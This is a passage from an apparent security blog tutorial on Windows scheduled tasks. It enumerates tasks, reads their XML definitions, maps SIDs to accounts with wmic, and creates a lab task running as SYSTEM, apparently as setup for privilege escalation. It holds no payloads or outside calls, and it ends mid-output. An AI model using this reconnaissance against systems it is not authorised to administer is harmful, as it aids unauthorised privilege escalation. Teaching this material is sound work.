+</div><blockquote>
+<p>Note: In the commands above we were able to list scheduled tasks that run with the integrity level of the current user. This means that if the tasks runs with a higher integrity level we must execute those commands as Administrator in order to enumerate them.</p>
+</blockquote>
+<p>Here is an example of tasks running with higher integrity levels, I&rsquo;m running PowerShell as <strong>administrator</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="py">TaskPath</span> <span class="o">-notlike</span> <span class="s2">&#34;\Microsoft*&#34;</span><span class="p">}</span> <span class="p">|</span> <span class="nb">ft </span><span class="n">TaskName</span><span class="p">,</span><span class="n">TaskPath</span><span class="p">,</span><span class="n">State</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">TaskName</span>                                                                      <span class="n">TaskPath</span> <span class="n">State</span>
+</span></span><span class="line"><span class="cl"><span class="p">--------</span>                                                                      <span class="p">--------</span> <span class="p">-----</span>
+</span></span><span class="line"><span class="cl"><span class="n">Custom</span> <span class="n">Task</span>                                                                   <span class="p">\</span>        <span class="n">Ready</span>
+</span></span><span class="line"><span class="cl"><span class="n">MicrosoftEdgeUpdateTaskMachineCore</span>                                            <span class="p">\</span>        <span class="n">Ready</span>
+</span></span><span class="line"><span class="cl"><span class="n">MicrosoftEdgeUpdateTaskMachineUA</span>                                              <span class="p">\</span>        <span class="n">Ready</span>
+</span></span><span class="line"><span class="cl"><span class="n">OneDrive</span> <span class="n">Reporting</span> <span class="nb">Task-S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">264094270</span><span class="p">-</span><span class="mf">2388996790</span><span class="p">-</span><span class="mf">3434637240</span><span class="p">-</span><span class="mf">1001</span>         <span class="p">\</span>        <span class="n">Ready</span>
+</span></span><span class="line"><span class="cl"><span class="n">OneDrive</span> <span class="n">Reporting</span> <span class="nb">Task-S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">264094270</span><span class="p">-</span><span class="mf">2388996790</span><span class="p">-</span><span class="mf">3434637240</span><span class="p">-</span><span class="mf">500</span>          <span class="p">\</span>        <span class="n">Ready</span>
+</span></span><span class="line"><span class="cl"><span class="n">OneDrive</span> <span class="n">Standalone</span> <span class="n">Update</span> <span class="nb">Task-S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">264094270</span><span class="p">-</span><span class="mf">2388996790</span><span class="p">-</span><span class="mf">3434637240</span><span class="p">-</span><span class="mf">1001</span> <span class="p">\</span>        <span class="n">Ready</span>
+</span></span><span class="line"><span class="cl"><span class="n">OneDrive</span> <span class="n">Standalone</span> <span class="n">Update</span> <span class="nb">Task-S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">264094270</span><span class="p">-</span><span class="mf">2388996790</span><span class="p">-</span><span class="mf">3434637240</span><span class="p">-</span><span class="mf">500</span>  <span class="p">\</span>        <span class="n">Ready</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s enumerate this tasks with Medium Integrity Level command line:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">schtasks</span> <span class="p">/</span><span class="n">query</span> <span class="p">/</span><span class="n">tn</span> <span class="s2">&#34;Custom Task&#34;</span> <span class="p">/</span><span class="n">xml</span>
+</span></span><span class="line"><span class="cl"><span class="n">ERROR</span><span class="err">:</span> <span class="n">Access</span> <span class="n">is</span> <span class="n">denied</span><span class="p">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we execute the same from a PowerShell console running as <strong>administrator</strong> (High Integrity Level):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">PS C:\Windows\system32&gt; schtasks /query /tn &#34;Custom Task&#34; /xml
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;Task</span> <span class="na">version=</span><span class="s">&#34;1.2&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.microsoft.com/windows/2004/02/mit/task&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;RegistrationInfo&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Date&gt;</span>2022-03-07T16:52:35<span class="nt">&lt;/Date&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Author&gt;</span>desktop-bn\user<span class="nt">&lt;/Author&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;URI&gt;</span>\Custom Task<span class="nt">&lt;/URI&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/RegistrationInfo&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Principals&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Principal</span> <span class="na">id=</span><span class="s">&#34;Author&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;UserId&gt;</span>S-1-5-18<span class="nt">&lt;/UserId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Principal&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/Principals&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Settings&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;DisallowStartIfOnBatteries&gt;</span>true<span class="nt">&lt;/DisallowStartIfOnBatteries&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;StopIfGoingOnBatteries&gt;</span>true<span class="nt">&lt;/StopIfGoingOnBatteries&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;MultipleInstancesPolicy&gt;</span>IgnoreNew<span class="nt">&lt;/MultipleInstancesPolicy&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;IdleSettings&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Duration&gt;</span>PT10M<span class="nt">&lt;/Duration&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;WaitTimeout&gt;</span>PT1H<span class="nt">&lt;/WaitTimeout&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;StopOnIdleEnd&gt;</span>true<span class="nt">&lt;/StopOnIdleEnd&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;RestartOnIdle&gt;</span>false<span class="nt">&lt;/RestartOnIdle&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/IdleSettings&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/Settings&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Triggers&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;TimeTrigger&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;StartBoundary&gt;</span>2022-03-07T16:52:00<span class="nt">&lt;/StartBoundary&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Repetition&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Interval&gt;</span>PT1M<span class="nt">&lt;/Interval&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/Repetition&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/TimeTrigger&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/Triggers&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Actions</span> <span class="na">Context=</span><span class="s">&#34;Author&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Exec&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Command&gt;</span>powershell.exe<span class="nt">&lt;/Command&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Arguments&gt;</span>/c C:\Schedule\helloworld.ps1<span class="nt">&lt;/Arguments&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Exec&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/Actions&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/Task&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There&rsquo;s an user ID with the following SID value:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;UserId&gt;</span>S-1-5-18<span class="nt">&lt;/UserId&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Query this SID to the FullName:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="n">wmic</span> <span class="n">useraccount</span> <span class="nb">where </span><span class="n">sid</span><span class="p">=</span><span class="s1">&#39;S-1-5-18&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Unexpected</span> <span class="k">switch</span> <span class="n">at</span> <span class="n">this</span> <span class="n">level</span><span class="p">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Note: This happens with PowerShell, use the Command Prompt instead.</p>
+</blockquote>
+<p>Well if we use the command prompt as administrator:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">wmic</span> <span class="n">useraccount</span> <span class="nb">where </span><span class="n">sid</span><span class="p">=</span><span class="s1">&#39;S-1-5-18&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">No</span> <span class="n">Instance</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">Available</span><span class="p">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>However, since this SID belongs to <code>NT AUTHORITY\SYSTEM</code>, we aren&rsquo;t able to query it. Alright to fix this issue we must configure the <code>user</code> of the scheduled tasks:</p>
+<figure><a class="lightgallery" href="/images/posts/custom-task-properties.png" title="/images/posts/custom-task-properties.png" data-thumbnail="/images/posts/custom-task-properties.png" data-sub-html="<h2>Lighthouse</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/custom-task-properties.png"
+            data-srcset="/images/posts/custom-task-properties.png, /images/posts/custom-task-properties.png 1.5x, /images/posts/custom-task-properties.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/custom-task-properties.png" />
+    </a><figcaption class="image-caption">Lighthouse</figcaption>
+    </figure>
+<blockquote>
+<p>Note: We must tick <code>Run with highest privileges</code> in order to be able elevate privileges.</p>
+</blockquote>
+<p>Now we fixed that issue since the user is not <code>NT AUTHORTY\SYSTEM</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">PS C:\Windows\system32&gt; schtasks /query /tn &#34;Custom Task&#34; /xml
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;Task</span> <span class="na">version=</span><span class="s">&#34;1.2&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.microsoft.com/windows/2004/02/mit/task&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;RegistrationInfo&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Date&gt;</span>2022-03-07T16:52:35<span class="nt">&lt;/Date&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Author&gt;</span>desktop-bn\user<span class="nt">&lt;/Author&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;URI&gt;</span>\Custom Task<span class="nt">&lt;/URI&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/RegistrationInfo&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Principals&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Principal</span> <span class="na">id=</span><span class="s">&#34;Author&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;UserId&gt;</span>S-1-5-21-264094270-2388996790-3434637240-1001<span class="nt">&lt;/UserId&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;LogonType&gt;</span>Password<span class="nt">&lt;/LogonType&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;RunLevel&gt;</span>HighestAvailable<span class="nt">&lt;/RunLevel&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Principal&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/Principals&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Settings&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;DisallowStartIfOnBatteries&gt;</span>true<span class="nt">&lt;/DisallowStartIfOnBatteries&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;StopIfGoingOnBatteries&gt;</span>true<span class="nt">&lt;/StopIfGoingOnBatteries&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;MultipleInstancesPolicy&gt;</span>IgnoreNew<span class="nt">&lt;/MultipleInstancesPolicy&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;IdleSettings&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;StopOnIdleEnd&gt;</span>true<span class="nt">&lt;/StopOnIdleEnd&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;RestartOnIdle&gt;</span>false<span class="nt">&lt;/RestartOnIdle&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/IdleSettings&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/Settings&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Triggers&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;TimeTrigger&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;StartBoundary&gt;</span>2022-03-07T16:52:00<span class="nt">&lt;/StartBoundary&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Repetition&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Interval&gt;</span>PT1M<span class="nt">&lt;/Interval&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/Repetition&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/TimeTrigger&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/Triggers&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Actions</span> <span class="na">Context=</span><span class="s">&#34;Author&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Exec&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Command&gt;</span>powershell.exe<span class="nt">&lt;/Command&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Arguments&gt;</span>/c C:\Schedule\helloworld.ps1<span class="nt">&lt;/Arguments&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Exec&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/Actions&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/Task&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Since we changed the user the SID changed:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;UserId&gt;</span>S-1-5-21-264094270-2388996790-3434637240-1001<span class="nt">&lt;/UserId&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now let&rsquo;s attempt to query this SID with a command prompt with low privileges, it doesn&rsquo;t need to be a console running as administrator:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">wmic</span> <span class="n">useraccount</span> <span class="nb">where </span><span class="n">sid</span><span class="p">=</span><span class="s1">&#39;S-1-5-21-264094270-2388996790-3434637240-1001&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">AccountType</span>  <span class="n">Caption</span>               <span class="n">Description</span>  <span class="n">Disabled</span>  <span class="n">Domain</span>           <span class="n">FullName</span>  <span class="n">InstallDate</span>  <span class="n">LocalAccount</span>  <span class="n">Lockout</span>  <span class="n">Name</span>  <span class="n">PasswordChangeable</span>  <span class="n">PasswordExpires</span>  <span class="n">PasswordRequired</span>  <span class="n">SID</span>                                            <span class="n">SIDType</span>  <span class="n">Status</span>
+</span></span><span class="line"><span class="cl"><span class="mf">512</span>          <span class="nb">desktop-bn</span><span class="p">\</span><span class="n">user</span>               <span class="n">FALSE</span>     <span class="nb">desktop-bn</span>                         <span class="n">TRUE</span>          <span class="n">FALSE</span>    <span class="n">user</span>  <span class="n">TRUE</span>                <span class="n">FALSE</span>            <span class="n">FALSE</span>             <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">264094270</span><span class="p">-</span><span class="mf">2388996790</span><span class="p">-</span><span class="mf">3434637240</span><span class="p">-</span><span class="mf">1001</span>  <span class="mf">1</span>        <span class="n">OK</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can also get SID of the user (reverse query):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">wmic</span> <span class="n">useraccount</span> <span class="nb">where </span><span class="n">name</span><span class="p">=</span><span class="s1">&#39;user&#39;</span> <span class="n">get</span> <span class="n">sid</span>
+</span></span><span class="line"><span class="cl"><span class="n">SID</span>
+</span></span><span class="line"><span class="cl"><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">264094270</span><span class="p">-</span><span class="mf">2388996790</span><span class="p">-</span><span class="mf">3434637240</span><span class="p">-</span><span class="mf">1001</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It is also running with the highest privileges (High Integrity Level):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;RunLevel&gt;</span>HighestAvailable<span class="nt">&lt;/RunLevel&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Is triggered (executed) at a time interval of every minute:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">  <span class="nt">&lt;Triggers&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;TimeTrigger&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;StartBoundary&gt;</span>2022-03-07T16:52:00<span class="nt">&lt;/StartBoundary&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Repetition&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Interval&gt;</span>PT1M<span class="nt">&lt;/Interval&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/Repetition&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/TimeTrigger&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/Triggers&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see the following action (what it executes) as well:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">  <span class="nt">&lt;Actions</span> <span class="na">Context=</span><span class="s">&#34;Author&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Exec&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Command&gt;</span>powershell.exe<span class="nt">&lt;/Command&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Arguments&gt;</span>/c C:\Schedule\helloworld.ps1<span class="nt">&lt;/Arguments&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Exec&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/Actions&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Still, the only way that we could find these scheduled tasks named &ldquo;Custom Task&rdquo; is by running a console as administrator or by using the Task Scheduler application and this is because we <strong>CREATED</strong> these tasks to run as <code>NT AUTHORITY\SYSTEM</code>. Therefore the only way to enumerate these tasks is by using the Administrator user or a High Integrity Level process. However, we did create a schedule using the GUI with our current user although by default it runs with <code>High Integrity Level</code> because otherwise, we wouldn&rsquo;t be able to create scheduled tasks that are configured to run <code>High Integrity Level</code>,  i.e, the <code>Run with highest privileges</code> setting. We can see this integrity level from the token with Process Hacker:</p>
+<figure><a class="lightgallery" href="/images/posts/task-scheduler-mmc.png" title="/images/posts/task-scheduler-mmc.png" data-thumbnail="/images/posts/task-scheduler-mmc.png" data-sub-html="<h2>Task Scheduler MMC</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/task-scheduler-mmc.png"
+            data-srcset="/images/posts/task-scheduler-mmc.png, /images/posts/task-scheduler-mmc.png 1.5x, /images/posts/task-scheduler-mmc.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/task-scheduler-mmc.png" />
+    </a><figcaption class="image-caption">Task Scheduler MMC</figcaption>
+    </figure>
+<p>The problem is in the fact that we did the following parameter <code>/ru &quot;NT AUTHORITY\SYSTEM&quot;</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="nb">sc </span><span class="n">minute</span> <span class="p">/</span><span class="n">mo</span> <span class="mf">5</span> <span class="p">/</span><span class="n">tn</span> <span class="s2">&#34;Custom Task 2&#34;</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;powershell.exe /c C:\Schedule\helloworld.ps1&#34;</span> <span class="p">/</span><span class="n">ru</span> <span class="s2">&#34;NT AUTHORITY\SYSTEM&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">SUCCESS</span><span class="err">:</span> <span class="n">The</span> <span class="n">scheduled</span> <span class="n">task</span> <span class="s2">&#34;Custom Task 2&#34;</span> <span class="n">has</span> <span class="n">successfully</span> <span class="n">been</span> <span class="n">created</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
